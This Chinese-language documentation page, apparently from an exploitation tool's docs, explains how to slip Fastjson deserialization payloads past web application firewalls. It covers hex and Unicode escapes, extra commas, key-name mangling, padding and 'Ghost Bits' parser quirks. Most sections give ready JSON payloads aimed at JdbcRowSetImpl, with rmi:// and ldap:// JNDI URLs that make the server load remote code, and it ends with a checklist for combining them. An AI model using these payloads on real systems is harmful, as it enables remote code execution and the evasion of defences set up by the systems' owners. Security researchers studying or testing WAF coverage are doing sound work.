---
title: WAF 绕过技巧
description: Fastjson Payload 常见 WAF 绕过：编码、Ghost Bits、嵌套、冗余逗号、键名替换与字符填充
order: 5
---

# WAF 绕过技巧

本文汇总 Fastjson Payload 常见的 **WAF 绕过** 手法，供安全研究与本地复现参考。实际效果依赖目标 WAF 规则与 Fastjson 版本，需按环境验证。

相关阅读：[Fastjson 探测分析](/docs/fastjson-detect) · [≤1.2.80 利用技巧](/docs/fastjson-1.2.80) · [≤1.2.68 利用技巧](/docs/fastjson-1.2.68) · [≤1.2.47 利用技巧](/docs/fastjson-1.2.47) · [Getter 触发技巧](/docs/getter-trigger)

---

## 1. Unicode / Hex 编码

对 `@type`、类名等关键字做 `\uXXXX`（Unicode）或 `\xXX`（Hex）编码，可绕过基于明文关键字的匹配：

```json
{"\x40\u0074\u0079\u0070\u0065":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```

也可对 JNDI 等危险字符串做 URL 编码，并配合嵌套反序列化结构：

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"$%7bjndi:ldap://1.1.1.1:1389/EvilObject%7d","autoCommit": true}}
```

说明：

- `\x40` / `\u0040` → `@`
- `\u0074\u0079\u0070\u0065` → `type`
- `$%7b...%7d` → `${...}`（URL 编码）

---

## 2. 多个逗号

Fastjson 解析较宽松，字段之间插入多余逗号通常仍可被解析，而部分 WAF 的 JSON 规则会因此失效：

```json
{,,,,,,"@type":"com.sun.rowset.JdbcRowSetImpl",,,,,,"dataSourceName":"rmi://127.0.0.1:1099/Exploit",,,,,, "autoCommit":true         }
```

---

## 3. `_` 和 `-` 绕过

Fastjson 在解析 JSON 字段的 **key** 时，会将 `_` 和 `-` 替换为空。

| 版本 | 行为 |
|------|------|
| **1.2.36 之前** | `_` 与 `-` 只能单独使用 |
| **1.2.36 及之后** | 支持 `_` 与 `-` 混合使用 |

示例（把 `dataSourceName` 拆成 `d_a_t_aSourceName`）：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",'d_a_t_aSourceName':"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```

同类思路也可用于其它敏感字段名（如 `autoCommit` → `auto_Commit` / `a-utoCommit` 等），需结合目标版本试探。

---

## 4. 字符填充

与 SQL 注入场景类似，部分 WAF 会对超大包体放宽检测或直接跳过深度检查。可在无害字段中填充大量字符：

```json
{
    "@type":"org.example.User",
    "username":"1",
    "f":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..."
}
```

实践中可将某字段值扩到约 **2 万** 个字符（如 2 万个 `a`），观察 WAF 是否仍拦截。

---

## 5. Unicode 再绕过（`\u+XXXX`）

在常规 `\uXXXX` 基础上，部分场景会尝试在 `u` 与十六进制之间插入 `+`（形如 `\u+XXXX`），用于对抗只匹配标准 Unicode 转义的规则：

```json
{"\u+040\u+074\u+079\u+070\u+065":"java.lang.AutoCloseabl\u+065"}
```

说明：

- 目标是让 WAF 看不到明文 `@type` / 类名片段，同时仍被后端解析链路接受（是否生效取决于 Fastjson / 中间层对转义的处理）。
- 可与第 1 节的标准 Unicode、Hex 编码组合试探。

---

## 6. Ghost Bits（GhostBytes）绕过

来源：Black Hat Asia 2026 *Cast Attack: A New Threat Posed by Ghost Bits in Java*（浅蓝 / 1ue 等）。核心不是单一 CVE，而是 **WAF 所见语义** 与 **后端解析语义** 不一致：安全设备按「无害 Unicode / 非法转义」放行，Java 侧经截断、默认值或宽松字符分类后还原出攻击字节。

Ghost Bits 伞下常见三类根因：

| 类型 | 根因 | Fastjson 相关 |
|------|------|----------------|
| A. 高位截断 | `char` → `byte` / `ch & 0xFF` 丢掉高 8 位 | 更常见于 Tomcat / Spring / Jackson 等 sink；本工具的 `ghost_bits` 用于生成此类变体 |
| B. 位运算 / 默认值折叠 | 非法 hex 被算法压成合法值 | Fastjson `\x`：`digits[]` 未占位槽为 **0** |
| C. 宽松 Unicode 解析 | 非 ASCII 数字仍被当成 hex digit | Fastjson `\u`：`Character.digit(c, 16)` |

工具中对应变换 id：`hex_ghost` / `unicode_digit` / `ghost_bits`（Web `/waf`、PoC 勾选、CLI `--waf` 可用）。

### 6.1 Fastjson `\x` 默认值（`hex_ghost`）

Fastjson 解析 `\xHH` 时用长度约 103 的 `digits[]`，只在 `0-9A-Fa-f` 处赋值；**其余下标默认为 0**。因此：

```text
\x4_  →  digits['4']*16 + digits['_'] = 4*16 + 0 = 0x40 = '@'
```

WAF 看到 `\x4_type`，看不到明文 `@type`；Fastjson 还原后仍触发 Autotype：

```json
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x","autoCommit":true}
```

同理，零半字节都可换成非 hex 填充符（码点须 **&lt; 103**），例如 `_`、`J`、`G`：

```json
{"\x4J\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl"}
```

说明：非零半字节只能用真正的 hex 字符（表中只有这些槽位非 0）。

### 6.2 Fastjson `\u` + Unicode 数字（`unicode_digit`）

`\uXXXX` 解析走 `Character.digit(c, 16)`，除 ASCII `0-9a-f` 外，还接受其它文字系统的数字，例如：

- 全角：`０-９`（U+FF10–U+FF19）
- 泰文：`๐-๙`（U+0E50–U+0E59）
- 旁遮普 / Gurmukhi：`੦-੯`（U+0A66–U+0A6F）

于是 `@`（U+0040）可写成全角数字形式的 `\u００４０`，WAF 若只匹配 ASCII hex，则漏检：

```json
{"\u００４０\u００７４\u００７９\u００７０\u００６５":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}
```

`a-f` 建议仍用 ASCII（全角拉丁字母不一定被 `Character.digit` 接受）。可与 `\x` 手法叠用试探。

### 6.3 经典高位嵌入（`ghost_bits`）

构造「低 8 位 = 目标 ASCII、高 8 位 ≠ 0」的字符：

```text
ghost(T, k) = chr((k << 8) | T)   # 避开代理区高字节 0xD8–0xDF
```

| 目标字节 | Hex | 用途示例 | 示例字符 |
|----------|-----|----------|----------|
| `@` | 0x40 | Fastjson `@type` | `ŀ` U+0140 |
| `.` | 0x2E | 路径 / 扩展名 | `阮` U+962E |
| `j` | 0x6A | `.jsp` 伪装 | `陪` U+966A |

示例（高位嵌入后的 `@type` 键名；**仅当链路存在 char→byte 截断时**后端才会还原为 `@type`）：

```json
{"ŀŴŹɰť":"com.sun.rowset.JdbcRowSetImpl"}
```

Fastjson Autotype 关键字绕过请优先试 **6.1 / 6.2**；`ghost_bits` 更适合验证 Tomcat `filename*`、Spring/Jetty URL 解码、Jackson 转义等截断类 sink，或与其它组件链组合。

### 6.4 视图对照

| 手法 | WAF 视图（示意） | Fastjson / 截断后视图 |
|------|------------------|------------------------|
| `hex_ghost` | `\x4_type` | `@type` |
| `unicode_digit` | `\u００４０type…` | `@type` |
| `ghost_bits` | `ŀŴŹɰť` | `@type`（需截断） |

---

## 7. 组合建议

实际绕过常把多种手法叠用，例如：

1. `@type` / 类名做 Unicode、Hex，或 Ghost 系列（`hex_ghost` / `unicode_digit`）
2. 敏感属性名插入 `_` / `-`
3. 字段间插入多余逗号
4. 无害字段做大体积填充
5. JNDI / LDAP 地址做 URL 编码或二次编码

建议在本地或授权环境先确认 Fastjson 版本与 AutoType 策略，再逐项验证 WAF 命中点，避免一次改太多导致无法定位有效手法。
